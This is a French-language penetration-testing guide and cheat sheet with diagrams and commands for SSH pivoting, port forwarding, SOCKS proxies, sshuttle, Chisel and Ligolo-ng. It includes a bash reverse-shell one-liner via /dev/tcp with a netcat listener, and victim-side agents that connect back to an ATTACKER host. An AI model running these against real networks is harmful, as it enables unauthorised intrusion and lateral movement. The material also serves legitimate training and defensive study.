# 🔀 SSH Pivoting & Rebond - Schémas Complets

Guide visuel complet pour le pivoting SSH, tunnels et rebonds réseau.

---

## 📖 Concepts de Base

```
    ┌────────────────────────────────────────────────────────────────┐
    │                    POURQUOI LE PIVOTING ?                      │
    │                                                                │
    │   ┌──────────┐                    ┌─────────────────────────┐  │
    │   │ Attacker │        ❌          │    Réseau Interne       │  │
    │   │ (Kali)   │ ──────────────────▶│    192.168.1.0/24       │  │
    │   └──────────┘   Pas d'accès      │    (serveurs, DB...)    │  │
    │                   direct!         └─────────────────────────┘  │
    │                                                                │
    │   SOLUTION: Utiliser une machine compromise comme "pivot"      │
    │                                                                │
    │   ┌──────────┐    ┌──────────┐    ┌─────────────────────────┐  │
    │   │ Attacker │───▶│  PIVOT   │───▶│    Réseau Interne       │  │
    │   │ (Kali)   │SSH │ (DMZ)    │    │    192.168.1.0/24       │  │
    │   └──────────┘    └──────────┘    └─────────────────────────┘  │
    │   10.0.0.5       10.0.0.10        Accès via le pivot! ✅       │
    │                  192.168.1.1                                   │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘
```

---

## 1️⃣ Local Port Forwarding (-L)

### Concept
```
    ┌────────────────────────────────────────────────────────────────┐
    │              LOCAL PORT FORWARDING (-L)                        │
    │                                                                │
    │   "Accéder à un service distant via un port local"             │
    │                                                                │
    │   COMMANDE:                                                    │
    │   ssh -L [local_port]:[target]:[target_port] user@pivot        │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘
```

### Schéma détaillé
```
    ┌────────────────────────────────────────────────────────────────┐
    │                                                                │
    │   ATTACKER                PIVOT                 TARGET         │
    │   10.0.0.5               10.0.0.10             192.168.1.100   │
    │                          192.168.1.1                           │
    │                                                                │
    │   ┌─────────┐           ┌─────────┐           ┌─────────┐      │
    │   │  Kali   │           │  Jump   │           │  Web    │      │
    │   │         │           │  Server │           │  Server │      │
    │   │ :8080 ◄─┼───────────┼─────────┼───────────┼─► :80   │      │
    │   │  LOCAL  │    SSH    │         │   HTTP    │         │      │
    │   │  PORT   │   TUNNEL  │         │           │         │      │
    │   └─────────┘           └─────────┘           └─────────┘      │
    │                                                                │
    │   COMMANDE:                                                    │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │ ssh -L 8080:192.168.1.100:80 user@10.0.0.10              │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    │   UTILISATION:                                                 │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │ curl http://localhost:8080                               │ │
    │   │ → Redirigé vers 192.168.1.100:80 via le pivot            │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘
```

### Flux des paquets
```
    ┌────────────────────────────────────────────────────────────────┐
    │  FLUX DES PAQUETS - LOCAL PORT FORWARD                         │
    │                                                                │
    │   1. Application se connecte à localhost:8080                  │
    │                                                                │
    │      ┌────────────┐                                            │
    │      │ Browser    │                                            │
    │      │ localhost  │                                            │
    │      │ :8080      │                                            │
    │      └─────┬──────┘                                            │
    │            │                                                   │
    │            ▼                                                   │
    │   2. SSH client intercepte et encapsule dans le tunnel SSH     │
    │                                                                │
    │      ┌────────────┐         ┌────────────┐                     │
    │      │ SSH Client │═══SSH══▶│ SSH Server │                     │
    │      │ (tunnel)   │  :22    │ (pivot)    │                     │
    │      └────────────┘         └─────┬──────┘                     │
    │                                   │                            │
    │                                   ▼                            │
    │   3. SSH server forward vers la destination finale             │
    │                                                                │
    │                             ┌────────────┐                     │
    │                             │ Target     │                     │
    │                             │ :80        │                     │
    │                             └────────────┘                     │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘
```

### Exemples pratiques
```
    ┌────────────────────────────────────────────────────────────────┐
    │  EXEMPLES LOCAL PORT FORWARD                                   │
    │                                                                │
    │  # Accéder à un serveur web interne                            │
    │  ssh -L 8080:192.168.1.100:80 user@pivot                       │
    │  → curl http://localhost:8080                                  │
    │                                                                │
    │  # Accéder à une base de données MySQL                         │
    │  ssh -L 3306:db.internal:3306 user@pivot                       │
    │  → mysql -h 127.0.0.1 -u root -p                               │
    │                                                                │
    │  # Accéder à un serveur RDP                                    │
    │  ssh -L 3389:192.168.1.50:3389 user@pivot                      │
    │  → xfreerdp /v:localhost                                       │
    │                                                                │
    │  # Accéder à plusieurs services (multiple -L)                  │
    │  ssh -L 8080:web:80 -L 3306:db:3306 -L 22:ssh:22 user@pivot    │
    │                                                                │
    │  # Bind sur toutes les interfaces (pour partager)              │
    │  ssh -L 0.0.0.0:8080:target:80 user@pivot                      │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘
```

---

## 2️⃣ Remote Port Forwarding (-R)

### Concept
```
    ┌────────────────────────────────────────────────────────────────┐
    │              REMOTE PORT FORWARDING (-R)                       │
    │                                                                │
    │   "Exposer un service local sur une machine distante"          │
    │   "Faire un tunnel inverse / reverse tunnel"                   │
    │                                                                │
    │   COMMANDE:                                                    │
    │   ssh -R [remote_port]:[local_target]:[local_port] user@remote │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘
```

### Schéma détaillé
```
    ┌────────────────────────────────────────────────────────────────┐
    │                                                                │
    │   ATTACKER                                      VICTIM         │
    │   10.0.0.5                                     192.168.1.50    │
    │                                                                │
    │   ┌─────────┐                                 ┌─────────┐      │
    │   │  Kali   │                                 │ Serveur │      │
    │   │         │                                 │ compromis│     │
    │   │ :4444 ◄─┼═════════════════════════════════┼─ :4444  │      │
    │   │ LISTEN  │         REVERSE SSH             │ FORWARD │      │
    │   │ nc -lvp │         TUNNEL                  │         │      │
    │   └─────────┘                                 └─────────┘      │
    │                                                                │
    │   SUR LA VICTIME (connexion sortante):                         │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │ ssh -R 4444:localhost:4444 attacker@10.0.0.5             │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    │   CAS D'USAGE: Recevoir un reverse shell du réseau interne     │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘
```

### Scénario reverse shell
```
    ┌────────────────────────────────────────────────────────────────┐
    │  SCÉNARIO: REVERSE SHELL VIA TUNNEL INVERSE                    │
    │                                                                │
    │   PROBLÈME:                                                    │
    │   La cible interne ne peut pas joindre l'attaquant directement │
    │                                                                │
    │   ┌──────────┐              ┌──────────┐    ┌──────────┐       │
    │   │ Attacker │      ❌      │ Firewall │    │ Internal │       │
    │   │ 10.0.0.5 │◄─────────────│          │◄───│  Target  │       │
    │   └──────────┘              └──────────┘    └──────────┘       │
    │                                              192.168.1.200     │
    │                                                                │
    │   SOLUTION: Tunnel inverse via le pivot                        │
    │                                                                │
    │   ÉTAPE 1: Créer le tunnel depuis le pivot                     │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │ # Sur le pivot (peut joindre l'attaquant)                │ │
    │   │ ssh -R 4444:localhost:4444 attacker@10.0.0.5             │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    │   ÉTAPE 2: Listener sur l'attaquant                            │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │ # Sur l'attaquant                                        │ │
    │   │ nc -lvnp 4444                                            │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    │   ÉTAPE 3: Reverse shell depuis la cible interne               │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │ # Sur la cible interne (vers le pivot)                   │ │
    │   │ bash -i >& /dev/tcp/192.168.1.1/4444 0>&1                │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    │   FLUX:                                                        │
    │   Internal ──▶ Pivot:4444 ══tunnel══▶ Attacker:4444            │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘
```

---

## 3️⃣ Dynamic Port Forwarding (-D) / SOCKS Proxy

### Concept
```
    ┌────────────────────────────────────────────────────────────────┐
    │              DYNAMIC PORT FORWARDING (-D)                      │
    │                                                                │
    │   "Créer un proxy SOCKS pour accéder à TOUT le réseau"         │
    │                                                                │
    │   Avantage: Pas besoin de créer un tunnel par service!         │
    │             Un seul proxy pour tout.                           │
    │                                                                │
    │   COMMANDE:                                                    │
    │   ssh -D [local_port] user@pivot                               │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘
```

### Schéma détaillé
```
    ┌────────────────────────────────────────────────────────────────┐
    │                                                                │
    │   ATTACKER              PIVOT              RÉSEAU INTERNE      │
    │                                                                │
    │   ┌─────────┐         ┌─────────┐         ┌─────────────────┐  │
    │   │  Kali   │         │  Jump   │         │ 192.168.1.0/24  │  │
    │   │         │   SSH   │  Server │         │                 │  │
    │   │ :1080   │════════▶│         │────────▶│ Web :80         │  │
    │   │ SOCKS   │         │         │────────▶│ SSH :22         │  │
    │   │ PROXY   │         │         │────────▶│ RDP :3389       │  │
    │   └─────────┘         └─────────┘         │ MySQL :3306     │  │
    │       │                                   │ SMB :445        │  │
    │       │                                   │ ...             │  │
    │       ▼                                   └─────────────────┘  │
    │   proxychains                                                  │
    │   ou config                                                    │
    │   navigateur                                                   │
    │                                                                │
    │   COMMANDE:                                                    │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │ ssh -D 1080 user@pivot                                   │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘
```

### Configuration proxychains
```
    ┌────────────────────────────────────────────────────────────────┐
    │  CONFIGURATION PROXYCHAINS                                     │
    │                                                                │
    │  # /etc/proxychains4.conf                                      │
    │  ┌──────────────────────────────────────────────────────────┐  │
    │  │  [ProxyList]                                             │  │
    │  │  socks5 127.0.0.1 1080                                   │  │
    │  └──────────────────────────────────────────────────────────┘  │
    │                                                                │
    │  UTILISATION:                                                  │
    │  ┌──────────────────────────────────────────────────────────┐  │
    │  │  # Scanner le réseau interne                             │  │
    │  │  proxychains nmap -sT -Pn 192.168.1.0/24                 │  │
    │  │                                                          │  │
    │  │  # Accéder à un service web                              │  │
    │  │  proxychains curl http://192.168.1.100                   │  │
    │  │                                                          │  │
    │  │  # SSH vers une machine interne                          │  │
    │  │  proxychains ssh user@192.168.1.50                       │  │
    │  │                                                          │  │
    │  │  # Connexion RDP                                         │  │
    │  │  proxychains xfreerdp /v:192.168.1.50                    │  │
    │  │                                                          │  │
    │  │  # Utiliser Metasploit                                   │  │
    │  │  proxychains msfconsole                                  │  │
    │  │  > setg Proxies socks5:127.0.0.1:1080                    │  │
    │  └──────────────────────────────────────────────────────────┘  │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘
```

### Configurer le navigateur
```
    ┌────────────────────────────────────────────────────────────────┐
    │  CONFIGURATION NAVIGATEUR (Firefox)                            │
    │                                                                │
    │  Settings → Network Settings → Manual proxy configuration      │
    │                                                                │
    │  ┌──────────────────────────────────────────────────────────┐  │
    │  │  SOCKS Host: 127.0.0.1     Port: 1080                    │  │
    │  │  ☑ SOCKS v5                                              │  │
    │  │  ☑ Proxy DNS when using SOCKS v5                         │  │
    │  └──────────────────────────────────────────────────────────┘  │
    │                                                                │
    │  Maintenant, naviguer vers http://192.168.1.100                │
    │  → Le trafic passe par le tunnel SSH!                          │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘
```

---

## 4️⃣ Double Pivot / Multi-Hop

### Scénario
```
    ┌────────────────────────────────────────────────────────────────┐
    │                      DOUBLE PIVOT                              │
    │                                                                │
    │   Accéder à un réseau derrière DEUX firewalls                  │
    │                                                                │
    │   ┌────────┐    ┌──────────┐    ┌───────────┐    ┌────────────────┐
    │   │Attacker│───▶│ Pivot1   │───▶│ Pivot2    │───▶│ Target Network │
    │   │10.0.0.5│    │10.0.0.10 │    │172.16.1.5 │    │ 192.168.1.0/24 │
    │   │        │    │172.16.1.1│    │192.168.1.1│    │                │
    │   └────────┘    └──────────┘    └───────────┘    └────────────────┘
    │       │              │              │               │          │
    │       │   Network 1  │   Network 2  │   Network 3   │          │
    │       │   10.0.0.0   │  172.16.1.0  │  192.168.1.0  │          │
    │       │              │              │               │          │
    └────────────────────────────────────────────────────────────────┘
```

### Méthode 1: Tunnels chaînés
```
    ┌────────────────────────────────────────────────────────────────┐
    │  MÉTHODE 1: TUNNELS SSH CHAÎNÉS                                │
    │                                                                │
    │  ÉTAPE 1: Tunnel vers Pivot1                                   │
    │  ┌──────────────────────────────────────────────────────────┐  │
    │  │  ssh -L 2222:172.16.1.5:22 user@10.0.0.10                │  │
    │  │                                                          │  │
    │  │  localhost:2222 → Pivot2:22                              │  │
    │  └──────────────────────────────────────────────────────────┘  │
    │                                                                │
    │  ÉTAPE 2: Tunnel vers Pivot2 (via le premier tunnel)           │
    │  ┌──────────────────────────────────────────────────────────┐  │
    │  │  ssh -L 8080:192.168.1.100:80 -p 2222 user@localhost     │  │
    │  │                                                          │  │
    │  │  localhost:8080 → Target:80                              │  │
    │  └──────────────────────────────────────────────────────────┘  │
    │                                                                │
    │  RÉSULTAT:                                                     │
    │  ┌──────────────────────────────────────────────────────────┐  │
    │  │  curl http://localhost:8080                              │  │
    │  │  → Atteint 192.168.1.100:80 via les deux pivots!         │  │
    │  └──────────────────────────────────────────────────────────┘  │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘
```

### Méthode 2: ProxyJump (-J)
```
    ┌────────────────────────────────────────────────────────────────┐
    │  MÉTHODE 2: PROXYJUMP (-J)                                     │
    │                                                                │
    │  SSH directement à travers plusieurs hops!                     │
    │                                                                │
    │  ┌──────────────────────────────────────────────────────────┐  │
    │  │  # Un seul hop                                           │  │
    │  │  ssh -J user@pivot1 user@target                          │  │
    │  │                                                          │  │
    │  │  # Deux hops                                             │  │
    │  │  ssh -J user@pivot1,user@pivot2 user@target              │  │
    │  │                                                          │  │
    │  │  # Trois hops                                            │  │
    │  │  ssh -J user1@p1,user2@p2,user3@p3 user@target           │  │
    │  └──────────────────────────────────────────────────────────┘  │
    │                                                                │
    │  SCHÉMA:                                                       │
    │                                                                │
    │  Attacker ──J──▶ Pivot1 ──J──▶ Pivot2 ──────▶ Target           │
    │                                                                │
    │                                                                │
    │  CONFIGURATION ~/.ssh/config:                                  │
    │  ┌──────────────────────────────────────────────────────────┐  │
    │  │  Host pivot1                                             │  │
    │  │      HostName 10.0.0.10                                  │  │
    │  │      User admin                                          │  │
    │  │                                                          │  │
    │  │  Host pivot2                                             │  │
    │  │      HostName 172.16.1.5                                 │  │
    │  │      User admin                                          │  │
    │  │      ProxyJump pivot1                                    │  │
    │  │                                                          │  │
    │  │  Host target                                             │  │
    │  │      HostName 192.168.1.100                              │  │
    │  │      User root                                           │  │
    │  │      ProxyJump pivot2                                    │  │
    │  └──────────────────────────────────────────────────────────┘  │
    │                                                                │
    │  Puis simplement:  ssh target                                  │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘
```

### Méthode 3: Double SOCKS
```
    ┌────────────────────────────────────────────────────────────────┐
    │  MÉTHODE 3: DOUBLE SOCKS PROXY                                 │
    │                                                                │
    │  ÉTAPE 1: SOCKS vers Pivot1                                    │
    │  ┌──────────────────────────────────────────────────────────┐  │
    │  │  ssh -D 1080 user@pivot1                                 │  │
    │  └──────────────────────────────────────────────────────────┘  │
    │                                                                │
    │  ÉTAPE 2: SOCKS vers Pivot2 (via premier SOCKS)                │
    │  ┌──────────────────────────────────────────────────────────┐  │
    │  │  proxychains ssh -D 1081 user@172.16.1.5                 │  │
    │  └──────────────────────────────────────────────────────────┘  │
    │                                                                │
    │  /etc/proxychains4.conf:                                       │
    │  ┌──────────────────────────────────────────────────────────┐  │
    │  │  [ProxyList]                                             │  │
    │  │  socks5 127.0.0.1 1081   # Utiliser le second proxy      │  │
    │  └──────────────────────────────────────────────────────────┘  │
    │                                                                │
    │  Maintenant accès complet au réseau 192.168.1.0/24!            │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘
```

---

## 5️⃣ SSHuttle

### Concept
```
    ┌────────────────────────────────────────────────────────────────┐
    │                        SSHUTTLE                                │
    │                                                                │
    │   "VPN over SSH" - Plus simple que les tunnels manuels         │
    │   Pas besoin de configurer proxychains!                        │
    │                                                                │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │  sshuttle -r user@pivot 192.168.1.0/24                   │ │
    │   │                                                          │ │
    │   │  Tout le trafic vers 192.168.1.0/24 passe                │ │
    │   │  automatiquement par le pivot!                           │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘
```

### Schéma
```
    ┌────────────────────────────────────────────────────────────────┐
    │                                                                │
    │   AVANT (sans sshuttle):                                       │
    │                                                                │
    │   ┌─────────┐                           ┌─────────────────┐    │
    │   │ Attacker│ ────────── ❌ ───────────▶│ 192.168.1.0/24  │    │
    │   └─────────┘    Pas de route           └─────────────────┘    │
    │                                                                │
    │   APRÈS (avec sshuttle):                                       │
    │                                                                │
    │   ┌─────────┐    ┌─────────┐            ┌─────────────────┐    │
    │   │ Attacker│═══▶│  Pivot  │═══════════▶│ 192.168.1.0/24  │    │
    │   └─────────┘    └─────────┘            └─────────────────┘    │
    │        │              │                                        │
    │        └──────────────┘                                        │
    │         Route automatique!                                     │
    │                                                                │
    │   COMMANDES:                                                   │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │  # Router un subnet                                      │ │
    │   │  sshuttle -r user@pivot 192.168.1.0/24                   │ │
    │   │                                                          │ │
    │   │  # Router plusieurs subnets                              │ │
    │   │  sshuttle -r user@pivot 192.168.1.0/24 10.10.10.0/24     │ │
    │   │                                                          │ │
    │   │  # Router tout le trafic (full VPN)                      │ │
    │   │  sshuttle -r user@pivot 0.0.0.0/0                        │ │
    │   │                                                          │ │
    │   │  # Exclure certains réseaux                              │ │
    │   │  sshuttle -r user@pivot 0/0 -x 10.0.0.0/8                │ │
    │   │                                                          │ │
    │   │  # Avec clé SSH                                          │ │
    │   │  sshuttle -r user@pivot --ssh-cmd 'ssh -i key.pem' 0/0   │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    │   Maintenant: ping 192.168.1.100 fonctionne directement!       │
    │               nmap 192.168.1.0/24 fonctionne!                  │
    │               Pas besoin de proxychains!                       │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘
```

---

## 6️⃣ Chisel (Alternative moderne)

### Schéma
```
    ┌────────────────────────────────────────────────────────────────┐
    │                         CHISEL                                 │
    │                                                                │
    │   Alternative à SSH quand SSH n'est pas disponible             │
    │   Binaire unique, pas de dépendances                           │
    │                                                                │
    │   MODE REVERSE SOCKS:                                          │
    │                                                                │
    │   ┌─────────┐              ┌─────────┐    ┌────────────────┐   │
    │   │Attacker │◀═════════════│ Victim  │───▶│ Internal Net   │   │
    │   │(server) │   Reverse    │(client) │    │ 192.168.1.0/24 │   │
    │   │ :8000   │   Tunnel     │         │    │                │   │
    │   │ :1080   │              │         │    │                │   │
    │   └─────────┘              └─────────┘    └────────────────┘   │
    │    SOCKS ▲                                                     │
    │          │                                                     │
    │   proxychains                                                  │
    │                                                                │
    │   COMMANDES:                                                   │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │  # Sur l'attaquant (serveur)                             │ │
    │   │  ./chisel server -p 8000 --reverse                       │ │
    │   │                                                          │ │
    │   │  # Sur la victime (client)                               │ │
    │   │  ./chisel client ATTACKER:8000 R:socks                   │ │
    │   │                                                          │ │
    │   │  # Utilisation                                           │ │
    │   │  proxychains nmap 192.168.1.0/24                         │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  CHISEL - PORT FORWARD                                         │
    │                                                                │
    │   # Forward un port spécifique                                 │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │  # Attaquant                                             │ │
    │   │  ./chisel server -p 8000 --reverse                       │ │
    │   │                                                          │ │
    │   │  # Victime - forward 192.168.1.100:80 vers attacker:8080 │ │
    │   │  ./chisel client ATTACKER:8000 R:8080:192.168.1.100:80   │ │
    │   │                                                          │ │
    │   │  # Accès                                                 │ │
    │   │  curl http://localhost:8080                              │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘
```

---

## 7️⃣ Ligolo-ng (Outil avancé)

```
    ┌────────────────────────────────────────────────────────────────┐
    │                        LIGOLO-NG                               │
    │                                                                │
    │   Tunneling avancé avec interface TUN                          │
    │   Pas besoin de SOCKS/proxychains!                             │
    │                                                                │
    │   ┌─────────┐    Interface    ┌─────────┐    ┌──────────────┐  │
    │   │Attacker │    TUN créée    │  Agent  │───▶│ Internal Net │  │
    │   │ Proxy   │◀═══════════════▶│ Victim  │    │192.168.1.0/24│  │
    │   └─────────┘                 └─────────┘    └──────────────┘  │
    │       │                                                        │
    │       │  ip route add 192.168.1.0/24 dev ligolo                │
    │       │                                                        │
    │       ▼                                                        │
    │   Trafic direct!                                               │
    │   nmap 192.168.1.0/24 (sans proxychains!)                      │
    │                                                                │
    │   SETUP:                                                       │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │  # Attaquant                                             │ │
    │   │  sudo ip tuntap add user $(whoami) mode tun ligolo       │ │
    │   │  sudo ip link set ligolo up                              │ │
    │   │  ./proxy -selfcert                                       │ │
    │   │                                                          │ │
    │   │  # Victime                                               │ │
    │   │  ./agent -connect ATTACKER:11601 -ignore-cert            │ │
    │   │                                                          │ │
    │   │  # Dans le proxy, après connexion de l'agent             │ │
    │   │  ligolo-ng » session                                     │ │
    │   │  ligolo-ng » start                                       │ │
    │   │                                                          │ │
    │   │  # Ajouter la route                                      │ │
    │   │  sudo ip route add 192.168.1.0/24 dev ligolo             │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘
```

---

## 8️⃣ Récapitulatif Visuel

```
    ┌────────────────────────────────────────────────────────────────┐
    │                   COMPARAISON DES MÉTHODES                     │
    │                                                                │
    │  ┌────────────────┬──────────────────────────────────────────┐ │
    │  │ MÉTHODE        │ CAS D'USAGE                              │ │
    │  ├────────────────┼──────────────────────────────────────────┤ │
    │  │ -L (Local)     │ Accéder à UN service distant             │ │
    │  │                │ ssh -L 8080:target:80 user@pivot         │ │
    │  ├────────────────┼──────────────────────────────────────────┤ │
    │  │ -R (Remote)    │ Exposer un service local / Reverse shell │ │
    │  │                │ ssh -R 4444:localhost:4444 user@attacker │ │
    │  ├────────────────┼──────────────────────────────────────────┤ │
    │  │ -D (Dynamic)   │ Accéder à TOUT via proxy SOCKS           │ │
    │  │                │ ssh -D 1080 user@pivot                   │ │
    │  │                │ proxychains nmap ...                     │ │
    │  ├────────────────┼──────────────────────────────────────────┤ │
    │  │ -J (ProxyJump) │ Multi-hop simplifié                      │ │
    │  │                │ ssh -J pivot1,pivot2 user@target         │ │
    │  ├────────────────┼──────────────────────────────────────────┤ │
    │  │ SSHuttle       │ VPN-like, pas de proxychains             │ │
    │  │                │ sshuttle -r user@pivot 192.168.1.0/24    │ │
    │  ├────────────────┼──────────────────────────────────────────┤ │
    │  │ Chisel         │ Pas de SSH disponible                    │ │
    │  │                │ Binaire unique                           │ │
    │  ├────────────────┼──────────────────────────────────────────┤ │
    │  │ Ligolo-ng      │ Tunneling avancé, interface TUN          │ │
    │  │                │ Trafic direct sans proxy                 │ │
    │  └────────────────┴──────────────────────────────────────────┘ │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘
```

---

## 9️⃣ Cheatsheet Rapide

```bash
# ═══════════════════════════════════════════════════════════════════
#                        SSH TUNNELING CHEATSHEET
# ═══════════════════════════════════════════════════════════════════

# LOCAL PORT FORWARD (-L)
# Accéder à target:port via pivot
ssh -L local_port:target:target_port user@pivot
ssh -L 8080:192.168.1.100:80 user@pivot
# → curl http://localhost:8080

# REMOTE PORT FORWARD (-R)
# Exposer local:port sur le serveur distant
ssh -R remote_port:local:local_port user@server
ssh -R 4444:localhost:4444 user@attacker
# → Utile pour reverse shell

# DYNAMIC SOCKS PROXY (-D)
# Proxy SOCKS pour tout le réseau
ssh -D 1080 user@pivot
# → proxychains nmap 192.168.1.0/24
# → Configure browser SOCKS: 127.0.0.1:1080

# PROXYJUMP (-J)
# SSH multi-hop
ssh -J user@pivot1 user@target
ssh -J user@pivot1,user@pivot2 user@target

# OPTIONS UTILES
ssh -N  # Pas de shell, juste le tunnel
ssh -f  # Background
ssh -L 8080:target:80 -N -f user@pivot  # Tunnel en background

# SSHUTTLE (VPN-like)
sshuttle -r user@pivot 192.168.1.0/24
sshuttle -r user@pivot 0.0.0.0/0  # Tout le trafic

# CHISEL
# Server (attacker)
./chisel server -p 8000 --reverse
# Client (victim)
./chisel client ATTACKER:8000 R:socks
./chisel client ATTACKER:8000 R:8080:internal:80

# LIGOLO-NG
# Proxy (attacker)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
# Agent (victim)
./agent -connect ATTACKER:11601 -ignore-cert
# Route
sudo ip route add 192.168.1.0/24 dev ligolo
```

---

## 📚 Ressources

- **SSH Manual** : https://man.openbsd.org/ssh
- **Chisel** : https://github.com/jpillora/chisel
- **Ligolo-ng** : https://github.com/nicocha30/ligolo-ng
- **SSHuttle** : https://github.com/sshuttle/sshuttle
- **HackTricks Tunneling** : https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding

---

**Tags:** `#ssh #pivoting #tunnel #port-forwarding #socks #proxy #chisel #ligolo #sshuttle #rebond`
